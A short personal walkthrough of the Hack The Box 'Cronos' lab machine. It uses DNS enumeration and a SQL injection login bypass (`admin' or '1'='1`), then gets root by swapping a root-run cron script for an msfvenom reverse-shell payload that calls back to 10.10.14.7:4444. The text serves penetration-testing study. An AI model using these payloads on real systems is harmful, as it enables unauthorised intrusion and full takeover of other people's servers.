## Takeaway
- Always consider a possibility for SQL injection when coming across a login panel.(!especially, when it is not a part of any framework)
- For some reason, `nc -h`'s output is printed over stderr which needs to be redirected in order to be piped into `nc` properly.
## Metadata
- Using `dig` can find potential domain name of the website.![[Pasted image 20231222205514.png]]
- Further DNS query reveals two vhosts.![[Pasted image 20231222211853.png]]
#### Attack Path
 <mark>Exploitation</mark>
- Use SQL injection with `admin' or '1'='1` to bypass login panel at `http://admin.cronos.htb/`![[Pasted image 20231222220655.png]]
	- Use Burpsuite to capture and modify the request to achieve remote code execution. (`nc` does not work since it is openBSD)
		- Transfer payload![[Pasted image 20231222225811.png]]
		- Give execution permission![[Pasted image 20231222225913.png]]
		- Payload Execution![[Pasted image 20231222230103.png]]
- `User.txt` ![[Pasted image 20231222232932.png]]
- <mark>Post-Exploitation</mark>'
	- Transfer linPEAS.sh. After running, it will identify a Cron job which ran as root but the file belongs the user www-data and can be modified by us.![[Pasted image 20231222231826.png]]![[Pasted image 20231222231852.png]]
	- First, remove the file named `artisan` and then use `msfvenom -p php/reverse_php lhost=10.10.14.7 lport=4444 -f raw -o artisan` to generate the payload and transfer onto where the file is used to be located. Finally, set up listener and wait for the Cron job to execute to receive a reverse shell call back.![[Pasted image 20231222232831.png]]